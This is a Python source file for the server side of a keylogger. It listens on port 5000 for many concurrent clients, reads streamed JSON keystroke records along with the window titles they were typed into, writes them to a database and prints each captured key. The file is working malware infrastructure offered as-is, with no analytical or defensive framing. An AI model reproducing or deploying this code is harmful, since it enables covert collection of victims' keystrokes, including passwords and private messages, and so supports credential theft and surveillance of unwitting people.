import socket
import json
import threading
from src.client.key_log import database


class KeylogServer:
    def __init__(self, host="0.0.0.0", port=5000):
        self.host = host
        self.port = port
        self.server_socket = None
        self.is_running = False

    def start(self):
        try:
            self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self.server_socket.bind((self.host, self.port))
            self.server_socket.listen(20)

            print(f"[+] Keylog Server running at {self.host}:{self.port}")
            self.is_running = True

            while self.is_running:
                client_socket, address = self.server_socket.accept()
                print(f"[+] New client {address}")

                threading.Thread(
                    target=self.client_handler,
                    args=(client_socket, address),
                    daemon=True
                ).start()

        except Exception as e:
            print("❌ Server error:", e)

        finally:
            self.stop()

    def client_handler(self, client_socket, address):
        buffer = ""

        try:
            while True:
                data = client_socket.recv(4096).decode("utf-8")
                if not data:
                    break

                buffer += data

                while "\n" in buffer:
                    line, buffer = buffer.split("\n", 1)

                    try:
                        keystroke = json.loads(line)

                        ok = database.create_keystroke(
                            key_data=keystroke.get("KeyData"),
                            window_title=keystroke.get("WindowTitle"),
                            view_id=keystroke.get("ViewID")
                        )

                        # In console
                        print(f"[KEY] {address} | {keystroke.get('WindowTitle')} → {keystroke.get('KeyData')}")

                        if not ok:
                            print("⚠ DB insert failed")

                    except Exception as e:
                        print("❌ JSON Error:", e)

        except Exception as e:
            print(f"❌ Client error: {address} -> {e}")

        finally:
            print(f"[-] Disconnected: {address}")
            client_socket.close()

    def stop(self):
        print("[*] Server stopped.")
        self.is_running = False
        if self.server_socket:
            self.server_socket.close()


if __name__ == "__main__":
    KeylogServer().start()
